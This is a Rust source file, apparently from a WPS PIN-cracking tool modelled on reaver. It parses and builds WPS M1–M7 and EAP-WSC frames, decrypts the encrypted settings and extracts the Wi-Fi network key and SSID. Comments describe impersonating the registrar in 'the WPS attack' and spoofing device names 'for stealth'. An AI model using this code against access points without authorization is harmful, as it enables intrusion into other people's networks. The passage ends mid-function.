/// The `data` parameter should be the raw WPS TLV payload — everything after
/// the EAP-WSC OpCode + Flags fields.
///
/// Returns None if the data doesn't contain a valid Message Type TLV.
pub fn parse_wps_message(data: &[u8]) -> Option<WpsMessage> {
    // First, find and validate the message type
    let mt_data = tlv_find(data, attr::MSG_TYPE)?;
    if mt_data.len() != 1 {
        return None;
    }
    let msg_type = WpsMessageType::from_u8(mt_data[0])?;

    let mut msg = WpsMessage::new(msg_type, data.to_vec());

    for tlv in WpsTlvIterator::new(data) {
        match tlv.attr_type {
            attr::ENROLLEE_NONCE => {
                if tlv.data.len() == 16 {
                    let mut nonce = [0u8; 16];
                    nonce.copy_from_slice(tlv.data);
                    msg.enrollee_nonce = Some(nonce);
                }
            }
            attr::REGISTRAR_NONCE => {
                if tlv.data.len() == 16 {
                    let mut nonce = [0u8; 16];
                    nonce.copy_from_slice(tlv.data);
                    msg.registrar_nonce = Some(nonce);
                }
            }
            attr::PUBLIC_KEY => {
                msg.public_key = Some(tlv.data.to_vec());
            }
            attr::E_HASH1 => {
                if tlv.data.len() == 32 {
                    let mut hash = [0u8; 32];
                    hash.copy_from_slice(tlv.data);
                    msg.e_hash1 = Some(hash);
                }
            }
            attr::E_HASH2 => {
                if tlv.data.len() == 32 {
                    let mut hash = [0u8; 32];
                    hash.copy_from_slice(tlv.data);
                    msg.e_hash2 = Some(hash);
                }
            }
            attr::R_HASH1 => {
                if tlv.data.len() == 32 {
                    let mut hash = [0u8; 32];
                    hash.copy_from_slice(tlv.data);
                    msg.r_hash1 = Some(hash);
                }
            }
            attr::R_HASH2 => {
                if tlv.data.len() == 32 {
                    let mut hash = [0u8; 32];
                    hash.copy_from_slice(tlv.data);
                    msg.r_hash2 = Some(hash);
                }
            }
            attr::E_SNONCE1 => {
                if tlv.data.len() == 16 {
                    let mut nonce = [0u8; 16];
                    nonce.copy_from_slice(tlv.data);
                    msg.e_snonce1 = Some(nonce);
                }
            }
            attr::E_SNONCE2 => {
                if tlv.data.len() == 16 {
                    let mut nonce = [0u8; 16];
                    nonce.copy_from_slice(tlv.data);
                    msg.e_snonce2 = Some(nonce);
                }
            }
            attr::R_SNONCE1 => {
                if tlv.data.len() == 16 {
                    let mut nonce = [0u8; 16];
                    nonce.copy_from_slice(tlv.data);
                    msg.r_snonce1 = Some(nonce);
                }
            }
            attr::R_SNONCE2 => {
                if tlv.data.len() == 16 {
                    let mut nonce = [0u8; 16];
                    nonce.copy_from_slice(tlv.data);
                    msg.r_snonce2 = Some(nonce);
                }
            }
            attr::AUTHENTICATOR => {
                if tlv.data.len() == 8 {
                    let mut auth = [0u8; 8];
                    auth.copy_from_slice(tlv.data);
                    msg.authenticator = Some(auth);
                }
            }
            attr::ENCRYPTED_SETTINGS => {
                msg.encrypted_settings = Some(tlv.data.to_vec());
            }
            attr::CONFIG_ERROR => {
                if let Some(v) = tlv.as_u16() {
                    msg.config_error = Some(v);
                }
            }
            // Device info attributes — populate device_info struct
            attr::VERSION => {
                if let Some(v) = tlv.as_u8() {
                    msg.device_info.version = v;
                }
            }
            attr::UUID_E => {
                if tlv.data.len() == 16 {
                    msg.device_info.uuid.copy_from_slice(tlv.data);
                }
            }
            attr::UUID_R => {
                if tlv.data.len() == 16 {
                    msg.device_info.uuid.copy_from_slice(tlv.data);
                }
            }
            attr::MAC_ADDRESS => {
                if tlv.data.len() == 6 {
                    let mut mac = [0u8; 6];
                    mac.copy_from_slice(tlv.data);
                    msg.device_info.mac_address = Some(mac);
                }
            }
            attr::MANUFACTURER => {
                msg.device_info.manufacturer = tlv.as_string();
            }
            attr::MODEL_NAME => {
                msg.device_info.model_name = tlv.as_string();
            }
            attr::MODEL_NUMBER => {
                msg.device_info.model_number = tlv.as_string();
            }
            attr::SERIAL_NUMBER => {
                msg.device_info.serial_number = tlv.as_string();
            }
            attr::DEVICE_NAME => {
                msg.device_info.device_name = tlv.as_string();
            }
            attr::PRIMARY_DEVICE_TYPE => {
                if tlv.data.len() == 8 {
                    msg.device_info.primary_device_type.copy_from_slice(tlv.data);
                }
            }
            attr::RF_BANDS => {
                if let Some(v) = tlv.as_u8() {
                    msg.device_info.rf_bands = v;
                }
            }
            attr::AUTH_TYPE_FLAGS => {
                if let Some(v) = tlv.as_u16() {
                    msg.device_info.auth_type_flags = v;
                }
            }
            attr::ENCRYPTION_TYPE_FLAGS => {
                if let Some(v) = tlv.as_u16() {
                    msg.device_info.encryption_type_flags = v;
                }
            }
            attr::OS_VERSION => {
                if let Some(v) = tlv.as_u32() {
                    msg.device_info.os_version = v;
                }
            }
            attr::WPS_STATE => {
                if let Some(v) = tlv.as_u8() {
                    msg.device_info.state = WpsState::from_u8(v);
                }
            }
            attr::CONFIG_METHODS => {
                if let Some(v) = tlv.as_u16() {
                    msg.device_info.config_methods = v;
                }
            }
            attr::DEVICE_PASSWORD_ID => {
                if let Some(v) = tlv.as_u16() {
                    msg.device_info.device_password_id = v;
                }
            }
            attr::RESPONSE_TYPE => {
                if let Some(v) = tlv.as_u8() {
                    msg.device_info.response_type = v;
                }
            }
            _ => {
                // Skip unknown TLV attributes
            }
        }
    }

    Some(msg)
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS M1 Builder Parameters
// ═══════════════════════════════════════════════════════════════════════════════

/// Parameters for building a WPS M1 message.
#[derive(Clone, Debug)]
pub struct WpsM1Params {
    /// Our enrollee nonce (16 bytes, should be random)
    pub enrollee_nonce: [u8; 16],
    /// Our MAC address (6 bytes)
    pub mac_address: [u8; 6],
    /// Our DH public key (192 bytes for Group 5)
    pub public_key: Vec<u8>,
    /// UUID-E (16 bytes, should be random)
    pub uuid_e: [u8; 16],
    /// Device name string (spoofable for stealth)
    pub device_name: String,
    /// Manufacturer string (spoofable)
    pub manufacturer: String,
    /// Model name string (spoofable)
    pub model_name: String,
    /// Model number string
    pub model_number: String,
    /// Serial number string
    pub serial_number: String,
    /// Auth type flags (default: Open | WPA-PSK | WPA2-PSK)
    pub auth_type_flags: u16,
    /// Encryption type flags (default: None | WEP | TKIP | AES)
    pub encryption_type_flags: u16,
    /// Connection type flags (default: ESS)
    pub connection_type_flags: u8,
    /// Config methods (default: PBC + Display + Keypad)
    pub config_methods: u16,
    /// WPS state (default: Not Configured)
    pub wps_state: u8,
    /// Primary device type (8 bytes, default: Computer/PC)
    pub primary_device_type: [u8; 8],
    /// RF bands (default: 2.4 + 5 GHz)
    pub rf_bands: u8,
    /// Association state (default: 0 = Not Associated)
    pub assoc_state: u16,
    /// Device password ID (default: 0 = Default PIN)
    pub device_password_id: u16,
    /// Config error (default: 0 = No Error)
    pub config_error: u16,
    /// OS version (default: 0x80000000)
    pub os_version: u32,
}

impl Default for WpsM1Params {
    fn default() -> Self {
        Self {
            enrollee_nonce: [0u8; 16],
            mac_address: [0u8; 6],
            public_key: Vec::new(),
            uuid_e: [0u8; 16],
            device_name: "WPS Client".to_string(),
            manufacturer: "Broadcom".to_string(),
            model_name: "BCM4352".to_string(),
            model_number: "1.0".to_string(),
            serial_number: "12345".to_string(),
            auth_type_flags: auth_type::ALL_PERSONAL,
            encryption_type_flags: encryption_type::ALL,
            connection_type_flags: conn_type::ESS,
            config_methods: config_methods::ENROLLEE_DEFAULT,
            wps_state: 0x01, // Not Configured
            // Primary Device Type: Computer / PC (Category 1, OUI 00:50:F2:04, Sub 1)
            primary_device_type: [0x00, 0x01, 0x00, 0x50, 0xF2, 0x04, 0x00, 0x01],
            rf_bands: rf_band::DUAL_BAND,
            assoc_state: 0x0000,
            device_password_id: password_id::DEFAULT_PIN,
            config_error: config_error::NO_ERROR,
            os_version: 0x80000000,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS Message Builders
// ═══════════════════════════════════════════════════════════════════════════════

/// Build a WPS M1 message (Enrollee → Registrar, first message of exchange).
///
/// Returns the WPS TLV body (not EAP-wrapped). Use `build_eap_wsc_msg()` to
/// wrap this in an EAP-WSC frame.
pub fn build_m1(params: &WpsM1Params) -> Vec<u8> {
    let mut b = WpsTlvBuilder::with_capacity(512);

    b.put_u8(attr::VERSION, WPS_VERSION_1);
    b.put_u8(attr::MSG_TYPE, WpsMessageType::M1 as u8);
    b.put(attr::UUID_E, &params.uuid_e);
    b.put(attr::MAC_ADDRESS, &params.mac_address);
    b.put(attr::ENROLLEE_NONCE, &params.enrollee_nonce);
    b.put(attr::PUBLIC_KEY, &params.public_key);
    b.put_u16(attr::AUTH_TYPE_FLAGS, params.auth_type_flags);
    b.put_u16(attr::ENCRYPTION_TYPE_FLAGS, params.encryption_type_flags);
    b.put_u8(attr::CONNECTION_TYPE_FLAGS, params.connection_type_flags);
    b.put_u16(attr::CONFIG_METHODS, params.config_methods);
    b.put_u8(attr::WPS_STATE, params.wps_state);
    b.put_str(attr::MANUFACTURER, &params.manufacturer);
    b.put_str(attr::MODEL_NAME, &params.model_name);
    b.put_str(attr::MODEL_NUMBER, &params.model_number);
    b.put_str(attr::SERIAL_NUMBER, &params.serial_number);
    b.put(attr::PRIMARY_DEVICE_TYPE, &params.primary_device_type);
    b.put_str(attr::DEVICE_NAME, &params.device_name);
    b.put_u8(attr::RF_BANDS, params.rf_bands);
    b.put_u16(attr::ASSOC_STATE, params.assoc_state);
    b.put_u16(attr::DEVICE_PASSWORD_ID, params.device_password_id);
    b.put_u16(attr::CONFIG_ERROR, params.config_error);
    b.put_u32(attr::OS_VERSION, params.os_version);

    b.finish()
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Registrar-side Message Builders (M2, M4, M6)
//
//  In the WPS attack, WE act as the Registrar. The AP is the Enrollee.
//  We RECEIVE M1/M3/M5/M7 (odd) and SEND M2/M4/M6 (even).
//  This matches reaver's architecture: wps_registrar_get_msg().
// ═══════════════════════════════════════════════════════════════════════════════

/// Parameters for building a WPS M2 message (Registrar → Enrollee).
#[derive(Clone, Debug)]
pub struct WpsM2Params {
    /// Enrollee nonce (16 bytes, echoed from M1)
    pub enrollee_nonce: [u8; 16],
    /// Our registrar nonce (16 bytes, fresh random)
    pub registrar_nonce: [u8; 16],
    /// UUID-R (16 bytes)
    pub uuid_r: [u8; 16],
    /// Our DH public key (192 bytes, PKr)
    pub public_key: Vec<u8>,
    /// Auth type flags
    pub auth_type_flags: u16,
    /// Encryption type flags
    pub encryption_type_flags: u16,
    /// Connection type flags
    pub connection_type_flags: u8,
    /// Config methods
    pub config_methods: u16,
    /// Manufacturer string
    pub manufacturer: String,
    /// Model name string
    pub model_name: String,
    /// Model number string
    pub model_number: String,
    /// Serial number string
    pub serial_number: String,
    /// Primary device type (8 bytes)
    pub primary_device_type: [u8; 8],
    /// Device name string
    pub device_name: String,
    /// RF bands
    pub rf_bands: u8,
    /// Association state
    pub assoc_state: u16,
    /// Config error
    pub config_error: u16,
    /// Device password ID
    pub device_password_id: u16,
    /// OS version
    pub os_version: u32,
}

impl Default for WpsM2Params {
    fn default() -> Self {
        Self {
            enrollee_nonce: [0u8; 16],
            registrar_nonce: [0u8; 16],
            uuid_r: [0u8; 16],
            public_key: Vec::new(),
            auth_type_flags: auth_type::ALL_PERSONAL,
            encryption_type_flags: encryption_type::ALL,
            connection_type_flags: conn_type::ESS,
            config_methods: config_methods::ENROLLEE_DEFAULT,
            manufacturer: "Broadcom".to_string(),
            model_name: "BCM4352".to_string(),
            model_number: "1.0".to_string(),
            serial_number: "12345".to_string(),
            primary_device_type: [0x00, 0x01, 0x00, 0x50, 0xF2, 0x04, 0x00, 0x01],
            device_name: "WPS Client".to_string(),
            rf_bands: rf_band::DUAL_BAND,
            assoc_state: 0x0000,
            config_error: config_error::NO_ERROR,
            device_password_id: password_id::DEFAULT_PIN,
            os_version: 0x80000000,
        }
    }
}

/// Build a WPS M2 message (Registrar → Enrollee).
///
/// M2 is the Registrar's response to M1. It echoes the enrollee nonce,
/// provides the registrar nonce and DH public key, and includes device info.
/// M2 does NOT have an Authenticator field (that starts from M3).
pub fn build_m2(params: &WpsM2Params) -> Vec<u8> {
    let mut b = WpsTlvBuilder::with_capacity(512);

    b.put_u8(attr::VERSION, WPS_VERSION_1);
    b.put_u8(attr::MSG_TYPE, WpsMessageType::M2 as u8);
    b.put(attr::ENROLLEE_NONCE, &params.enrollee_nonce);
    b.put(attr::REGISTRAR_NONCE, &params.registrar_nonce);
    b.put(attr::UUID_R, &params.uuid_r);
    b.put(attr::PUBLIC_KEY, &params.public_key);
    b.put_u16(attr::AUTH_TYPE_FLAGS, params.auth_type_flags);
    b.put_u16(attr::ENCRYPTION_TYPE_FLAGS, params.encryption_type_flags);
    b.put_u8(attr::CONNECTION_TYPE_FLAGS, params.connection_type_flags);
    b.put_u16(attr::CONFIG_METHODS, params.config_methods);
    b.put_str(attr::MANUFACTURER, &params.manufacturer);
    b.put_str(attr::MODEL_NAME, &params.model_name);
    b.put_str(attr::MODEL_NUMBER, &params.model_number);
    b.put_str(attr::SERIAL_NUMBER, &params.serial_number);
    b.put(attr::PRIMARY_DEVICE_TYPE, &params.primary_device_type);
    b.put_str(attr::DEVICE_NAME, &params.device_name);
    b.put_u8(attr::RF_BANDS, params.rf_bands);
    b.put_u16(attr::ASSOC_STATE, params.assoc_state);
    b.put_u16(attr::CONFIG_ERROR, params.config_error);
    b.put_u16(attr::DEVICE_PASSWORD_ID, params.device_password_id);
    b.put_u32(attr::OS_VERSION, params.os_version);

    // WPS 2.0 Version2 extension — required by modern APs.
    b.put(attr::VENDOR_EXTENSION, &[0x00, 0x37, 0x2A, 0x00, 0x01, WPS_VERSION_2]);

    // Authenticator placeholder — caller must compute with AuthKey and patch.
    // M2 Authenticator = HMAC-SHA256(AuthKey, M1_body || M2_body_up_to_here)[0:8]
    b.put(attr::AUTHENTICATOR, &[0u8; 8]);

    b.finish()
}

/// Build a WPS M4 message (Registrar → Enrollee).
///
/// M4 contains R-Hash1, R-Hash2, and EncryptedSettings with R-S1 inside.
/// The `encrypted_settings` should be IV(16) + AES-CBC(KeyWrapKey, R-S1_TLV + KWA_TLV).
///
/// Authenticator is a placeholder — caller must compute and patch with `patch_authenticator()`.
pub fn build_m4(
    enrollee_nonce: &[u8; 16],
    r_hash1: &[u8; 32],
    r_hash2: &[u8; 32],
    encrypted_settings: &[u8],
) -> Vec<u8> {
    let mut b = WpsTlvBuilder::with_capacity(384);

    b.put_u8(attr::VERSION, WPS_VERSION_1);
    b.put_u8(attr::MSG_TYPE, WpsMessageType::M4 as u8);
    b.put(attr::ENROLLEE_NONCE, enrollee_nonce);
    b.put(attr::R_HASH1, r_hash1);
    b.put(attr::R_HASH2, r_hash2);
    b.put(attr::ENCRYPTED_SETTINGS, encrypted_settings);
    // Version2 MUST come before Authenticator. Authenticator MUST be last.
    b.put(attr::VENDOR_EXTENSION, &[0x00, 0x37, 0x2A, 0x00, 0x01, WPS_VERSION_2]);
    b.put(attr::AUTHENTICATOR, &[0u8; 8]);

    b.finish()
}

/// Build a WPS M6 message (Registrar → Enrollee).
///
/// M6 contains EncryptedSettings with R-S2 inside.
/// The `encrypted_settings` should be IV(16) + AES-CBC(KeyWrapKey, R-S2_TLV + KWA_TLV).
///
/// Authenticator is a placeholder — caller must compute and patch.
pub fn build_m6(
    enrollee_nonce: &[u8; 16],
    encrypted_settings: &[u8],
) -> Vec<u8> {
    let mut b = WpsTlvBuilder::with_capacity(256);

    b.put_u8(attr::VERSION, WPS_VERSION_1);
    b.put_u8(attr::MSG_TYPE, WpsMessageType::M6 as u8);
    b.put(attr::ENROLLEE_NONCE, enrollee_nonce);
    b.put(attr::ENCRYPTED_SETTINGS, encrypted_settings);
    b.put(attr::VENDOR_EXTENSION, &[0x00, 0x37, 0x2A, 0x00, 0x01, WPS_VERSION_2]);
    b.put(attr::AUTHENTICATOR, &[0u8; 8]);

    b.finish()
}

/// Decrypt and parse the Encrypted Settings from M5 (contains E-S1) or M7 (contains E-S2 + credentials).
///
/// The encrypted_settings blob is: IV(16) + AES-CBC ciphertext.
/// Decrypts with KeyWrapKey, verifies KWA, extracts TLV contents.
///
/// Returns the decrypted TLV data on success (caller parses for E-SNonce1/2 and credentials).
pub fn decrypt_encrypted_settings(
    key_wrap_key: &[u8; 16],
    auth_key: &[u8; 32],
    encrypted_settings: &[u8],
) -> Option<Vec<u8>> {
    if encrypted_settings.len() < 32 {
        return None; // Need at least IV(16) + one block(16)
    }

    let iv = &encrypted_settings[..16];
    let ciphertext = &encrypted_settings[16..];

    let plaintext = wps_aes_decrypt(key_wrap_key, iv, ciphertext)?;

    // Verify Key Wrap Authenticator (KWA):
    // Find the KWA TLV, compute HMAC over everything before it
    let mut kwa_offset = None;
    let mut offset = 0;
    while offset + 4 <= plaintext.len() {
        let attr_type = u16::from_be_bytes([plaintext[offset], plaintext[offset + 1]]);
        let length = u16::from_be_bytes([plaintext[offset + 2], plaintext[offset + 3]]) as usize;

        if offset + 4 + length > plaintext.len() {
            break;
        }

        if attr_type == attr::KEY_WRAP_AUTHENTICATOR && length == 8 {
            kwa_offset = Some(offset);
            break;
        }
        offset += 4 + length;
    }

    if let Some(kwa_off) = kwa_offset {
        // KWA = first 8 bytes of HMAC-SHA256(AuthKey, data_before_KWA_TLV)
        let data_before_kwa = &plaintext[..kwa_off];
        let expected_kwa = wps_hmac_sha256(auth_key, data_before_kwa)?;
        let actual_kwa = &plaintext[kwa_off + 4..kwa_off + 12];
        if actual_kwa != &expected_kwa[..8] {
            return None; // KWA verification failed
        }
    }
    // Return full plaintext (caller extracts what they need via TLV parsing)
    Some(plaintext)
}

/// Extract network credentials (SSID + Network Key) from decrypted M7 settings.
///
/// M7's encrypted settings contain E-S2 + optional Credential TLVs.
/// Some APs put the credential directly in the encrypted blob; others
/// wrap it in a CREDENTIAL container TLV.
///
/// Returns (network_key, ssid) if found.
pub fn extract_credentials_from_settings(plaintext: &[u8]) -> Option<(String, String)> {
    let mut network_key = None;
    let mut ssid = None;

    // First try direct TLV scan
    for tlv in WpsTlvIterator::new(plaintext) {
        match tlv.attr_type {
            attr::NETWORK_KEY => {
                network_key = Some(tlv.as_string());
            }
            attr::SSID => {
                ssid = Some(tlv.as_string());
            }
            attr::CREDENTIAL => {
                // Credential is a nested TLV container — parse inside
                for inner in WpsTlvIterator::new(tlv.data) {
                    match inner.attr_type {
                        attr::NETWORK_KEY => {
                            network_key = Some(inner.as_string());
                        }
                        attr::SSID => {
                            ssid = Some(inner.as_string());
                        }
                        _ => {}
                    }
                }
            }
            _ => {}
        }
    }

    let key = network_key?;
    let name = ssid.unwrap_or_default();
    Some((key, name))
}

/// Build a WPS authenticator for message chaining.
///
/// WPS authenticator = first 8 bytes of HMAC-SHA256(AuthKey, prev_msg || current_msg_before_auth).
/// The `prev_msg` is the raw body of the previous message in the exchange.
/// The `current_msg` is the current message body up to (but not including) the authenticator value.
pub fn compute_wps_authenticator(
    auth_key: &[u8; 32],
    prev_msg: &[u8],
    current_msg_before_auth: &[u8],
) -> Option<[u8; 8]> {
    let hash = wps_hmac_sha256_multi(auth_key, &[prev_msg, current_msg_before_auth])?;
    let mut auth = [0u8; 8];
    auth.copy_from_slice(&hash[..8]);
    Some(auth)
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Enrollee-side Message Builders (M1, M3, M5, M7) — legacy, kept for tests
// ═══════════════════════════════════════════════════════════════════════════════

/// Build a WPS M3 message body (Enrollee → Registrar).
///
/// The caller must provide pre-computed E-Hash1 and E-Hash2, plus the
/// registrar nonce from M2. The authenticator is computed as
/// HMAC-AuthKey(M3_body_so_far), with first 8 bytes used.
///
/// NOTE: Authenticator computation requires the AuthKey. Since crypto is not
/// implemented in this module, the authenticator field is included with a
/// placeholder. The caller (attack engine) must compute and patch the
/// authenticator after the fact using `patch_authenticator()`.
pub fn build_m3(
    registrar_nonce: &[u8; 16],
    e_hash1: &[u8; 32],
    e_hash2: &[u8; 32],
) -> Vec<u8> {
    let mut b = WpsTlvBuilder::with_capacity(256);

    b.put_u8(attr::VERSION, WPS_VERSION_1);
    b.put_u8(attr::MSG_TYPE, WpsMessageType::M3 as u8);
    b.put(attr::REGISTRAR_NONCE, registrar_nonce);
    b.put(attr::E_HASH1, e_hash1);
    b.put(attr::E_HASH2, e_hash2);
    // Authenticator placeholder — caller must compute with AuthKey and patch
    b.put(attr::AUTHENTICATOR, &[0u8; 8]);

    b.finish()
}

/// Build a WPS M5 message body (Enrollee → Registrar).
///
/// M5 contains EncryptedSettings with E-SNonce1 inside.
/// The `encrypted_settings` parameter should be the pre-built
/// IV(16) + AES-CBC(KeyWrapKey, E-SNonce1_TLV + KWA_TLV) blob.
///
/// Authenticator is a placeholder — caller must compute and patch.
pub fn build_m5(
    registrar_nonce: &[u8; 16],
    encrypted_settings: &[u8],
) -> Vec<u8> {
    let mut b = WpsTlvBuilder::with_capacity(256);

    b.put_u8(attr::VERSION, WPS_VERSION_1);
    b.put_u8(attr::MSG_TYPE, WpsMessageType::M5 as u8);
    b.put(attr::REGISTRAR_NONCE, registrar_nonce);
    b.put(attr::ENCRYPTED_SETTINGS, encrypted_settings);
    // Authenticator placeholder — caller must compute with AuthKey and patch
    b.put(attr::AUTHENTICATOR, &[0u8; 8]);

    b.finish()
}

/// Build a WPS M7 message body (Enrollee → Registrar).
///
/// M7 contains EncryptedSettings with E-SNonce2 inside.
/// The `encrypted_settings` parameter should be the pre-built
/// IV(16) + AES-CBC(KeyWrapKey, E-SNonce2_TLV + KWA_TLV) blob.
///
/// Authenticator is a placeholder — caller must compute and patch.
pub fn build_m7(
    registrar_nonce: &[u8; 16],
    encrypted_settings: &[u8],
) -> Vec<u8> {
    let mut b = WpsTlvBuilder::with_capacity(256);

    b.put_u8(attr::VERSION, WPS_VERSION_1);
    b.put_u8(attr::MSG_TYPE, WpsMessageType::M7 as u8);
    b.put(attr::REGISTRAR_NONCE, registrar_nonce);
    b.put(attr::ENCRYPTED_SETTINGS, encrypted_settings);
    // Authenticator placeholder — caller must compute with AuthKey and patch
    b.put(attr::AUTHENTICATOR, &[0u8; 8]);

    b.finish()
}

/// Build a WSC_ACK message body.
pub fn build_wsc_ack(
    enrollee_nonce: &[u8; 16],
    registrar_nonce: &[u8; 16],
) -> Vec<u8> {
    let mut b = WpsTlvBuilder::with_capacity(64);

    b.put_u8(attr::VERSION, WPS_VERSION_1);
    b.put_u8(attr::MSG_TYPE, WpsMessageType::WscAck as u8);
    b.put(attr::ENROLLEE_NONCE, enrollee_nonce);
    b.put(attr::REGISTRAR_NONCE, registrar_nonce);

    b.finish()
}

/// Build a WSC_NACK message body.
pub fn build_wsc_nack(
    enrollee_nonce: &[u8; 16],
    registrar_nonce: &[u8; 16],
    config_error: u16,
) -> Vec<u8> {
    let mut b = WpsTlvBuilder::with_capacity(64);

    b.put_u8(attr::VERSION, WPS_VERSION_1);
    b.put_u8(attr::MSG_TYPE, WpsMessageType::WscNack as u8);
    b.put(attr::ENROLLEE_NONCE, enrollee_nonce);
    b.put(attr::REGISTRAR_NONCE, registrar_nonce);
    b.put_u16(attr::CONFIG_ERROR, config_error);

    b.finish()
}

/// Build a WSC_Done message body.
pub fn build_wsc_done(
    enrollee_nonce: &[u8; 16],
    registrar_nonce: &[u8; 16],
) -> Vec<u8> {
    let mut b = WpsTlvBuilder::with_capacity(64);

    b.put_u8(attr::VERSION, WPS_VERSION_1);
    b.put_u8(attr::MSG_TYPE, WpsMessageType::WscDone as u8);
    b.put(attr::ENROLLEE_NONCE, enrollee_nonce);
    b.put(attr::REGISTRAR_NONCE, registrar_nonce);

    b.finish()
}

/// Patch the authenticator field in a WPS message body.
///
/// Finds the AUTHENTICATOR TLV and replaces its 8-byte value with the
/// provided authenticator. Returns true if the patch was successful,
/// false if the authenticator TLV was not found.
///
/// The caller should compute the authenticator as:
///   first 8 bytes of HMAC-SHA256(AuthKey, prev_msg_body || current_msg_body_without_authenticator_value)
///
/// In practice, the simplified approach from the C reference computes:
///   HMAC-SHA256(AuthKey, current_msg_body_up_to_authenticator_TLV)
pub fn patch_authenticator(body: &mut [u8], authenticator: &[u8; 8]) -> bool {
    // Walk TLVs to find the Authenticator attribute
    let mut offset = 0;
    while offset + 4 <= body.len() {
        let attr_type = u16::from_be_bytes([body[offset], body[offset + 1]]);
        let length = u16::from_be_bytes([body[offset + 2], body[offset + 3]]) as usize;

        if offset + 4 + length > body.len() {
            return false;
        }

        if attr_type == attr::AUTHENTICATOR && length == 8 {
            body[offset + 4..offset + 4 + 8].copy_from_slice(authenticator);
            return true;
        }

        offset += 4 + length;
    }
    false
}

/// Patch the authenticator value at a known offset (avoids re-scanning TLVs).
pub fn patch_authenticator_at(body: &mut [u8], value_offset: usize, authenticator: &[u8; 8]) {
    body[value_offset..value_offset + 8].copy_from_slice(authenticator);
}

/// Build a WPS vendor-specific IE for association requests.
///
/// Returns the complete IE: tag(1) + length(1) + OUI(4) + WPS_TLVs.
/// The WPS body includes Version (0x10) and Request Type (Enrollee, Open).
pub fn build_wps_assoc_ie() -> Vec<u8> {
    // Build WPS TLV body
    let mut wps_body = WpsTlvBuilder::new();
    wps_body.put_u8(attr::VERSION, WPS_VERSION_1);
    wps_body.put_u8(attr::REQUEST_TYPE, request_type::REGISTRAR);
    let body = wps_body.finish();

    // Wrap in vendor-specific IE: tag(221) + len + OUI(00:50:F2:04) + body
    let mut ie = Vec::with_capacity(2 + 4 + body.len());
    ie.push(221); // Vendor Specific IE tag
    ie.push((4 + body.len()) as u8); // Length = OUI(4) + body
    ie.extend_from_slice(&[0x00, 0x50, 0xF2, 0x04]); // WPS OUI
    ie.extend_from_slice(&body);

    ie
}

// ═══════════════════════════════════════════════════════════════════════════════
//  EAP-WSC Frame Builders
// ═══════════════════════════════════════════════════════════════════════════════

/// Build an EAP-Response/Identity frame for WPS enrollment.
///
/// Returns the complete EAP packet: Code(1) + ID(1) + Length(2) + Type(1) + Identity.
pub fn build_eap_identity_response(id: u8) -> Vec<u8> {
    let identity = WPS_REGISTRAR_IDENTITY.as_bytes();
    let eap_len = 5 + identity.len(); // Code + ID + Length(2) + Type + identity

    let mut eap = Vec::with_capacity(eap_len);
    eap.push(2); // Code: Response
    eap.push(id); // Identifier
    eap.extend_from_slice(&(eap_len as u16).to_be_bytes()); // Length
    eap.push(1); // Type: Identity
    eap.extend_from_slice(identity);

    eap
}

/// Build an EAP-WSC_Start frame (sent by AP/Registrar to initiate WPS).
///
/// Returns the complete EAP packet. This is typically sent as an EAP-Request
/// from the registrar side.
pub fn build_eap_wsc_start(id: u8) -> Vec<u8> {
    // EAP-Request/WSC with OpCode=WSC_Start and no body
    let eap_len: u16 = 5 + 8 + 2; // EAP header(5) + Expanded(8) + OpCode+Flags(2)

    let mut eap = Vec::with_capacity(eap_len as usize);
    eap.push(1); // Code: Request
    eap.push(id);
    eap.extend_from_slice(&eap_len.to_be_bytes());
    eap.push(254); // Type: Expanded
    // WFA Vendor-ID
    eap.extend_from_slice(&WFA_VENDOR_ID);
    // Vendor-Type: SimpleConfig
    eap.extend_from_slice(&WFA_VENDOR_TYPE_SIMPLECONFIG);
    // OpCode: WSC_Start
    eap.push(opcode::WSC_START);
    // Flags: none
    eap.push(0x00);

    eap
}

/// Build an EAP-Response/WSC_MSG frame wrapping a WPS TLV body.
///
/// Wraps the given WPS message body in the EAP-WSC framing:
/// EAP header + Expanded Type (254) + WFA Vendor-ID + Vendor-Type +
/// OpCode + Flags + WPS body.
///
/// `op_code`: One of `opcode::WSC_MSG`, `opcode::WSC_ACK`, `opcode::WSC_NACK`,
///            `opcode::WSC_DONE`.
pub fn build_eap_wsc_msg(id: u8, op_code: u8, wps_body: &[u8]) -> Vec<u8> {
    // Code(1) + ID(1) + Length(2) + Type(1) + VendorID(3) + VendorType(4) + OpCode(1) + Flags(1) + body
    // = 14 + body
    let eap_len = 14 + wps_body.len();

    let mut eap = Vec::with_capacity(eap_len);
    eap.push(2); // Code: Response
    eap.push(id);
    eap.extend_from_slice(&(eap_len as u16).to_be_bytes());
    eap.push(254); // Type: Expanded
    // WFA Vendor-ID: 00:37:2A
    eap.extend_from_slice(&WFA_VENDOR_ID);
    // Vendor-Type: SimpleConfig (00:00:00:01)
    eap.extend_from_slice(&WFA_VENDOR_TYPE_SIMPLECONFIG);
    // OpCode
    eap.push(op_code);
    // Flags: no fragmentation
    eap.push(0x00);
    // WPS TLV body
    eap.extend_from_slice(wps_body);

    eap
}

/// Build an EAP-WSC fragment acknowledgment.
///
/// Sent when the peer has received a fragment and is ready for the next.
pub fn build_eap_wsc_frag_ack(id: u8) -> Vec<u8> {
    let eap_len: u16 = 5 + 8 + 2; // Same as WSC_Start structure, but with FRAG_ACK opcode

    let mut eap = Vec::with_capacity(eap_len as usize);
    eap.push(2); // Code: Response
    eap.push(id);
    eap.extend_from_slice(&eap_len.to_be_bytes());
    eap.push(254); // Type: Expanded
    eap.extend_from_slice(&WFA_VENDOR_ID);
    eap.extend_from_slice(&WFA_VENDOR_TYPE_SIMPLECONFIG);
    eap.push(opcode::WSC_FRAG_ACK);
    eap.push(0x00); // Flags: none

    eap
}

/// Parse the EAP-WSC header from an EAP packet.
///
/// Validates that the packet is an EAP Expanded Type with WFA vendor ID
/// and SimpleConfig vendor type. Returns the OpCode, flags, and WPS body
/// slice on success.
///
/// Input: complete EAP packet starting from Code byte.
pub fn parse_eap_wsc(data: &[u8]) -> Option<EapWscHeader<'_>> {
    // Minimum: Code(1) + ID(1) + Length(2) + Type(1) + VendorID(3) + VendorType(4) + OpCode(1) + Flags(1) = 14
    if data.len() < 14 {
        return None;
    }

    let code = data[0];
    let id = data[1];
    let length = u16::from_be_bytes([data[2], data[3]]) as usize;
    let eap_type = data[4];

    // Must be Expanded Type (254)
    if eap_type != 254 {
        return None;
    }

    // Verify WFA Vendor-ID
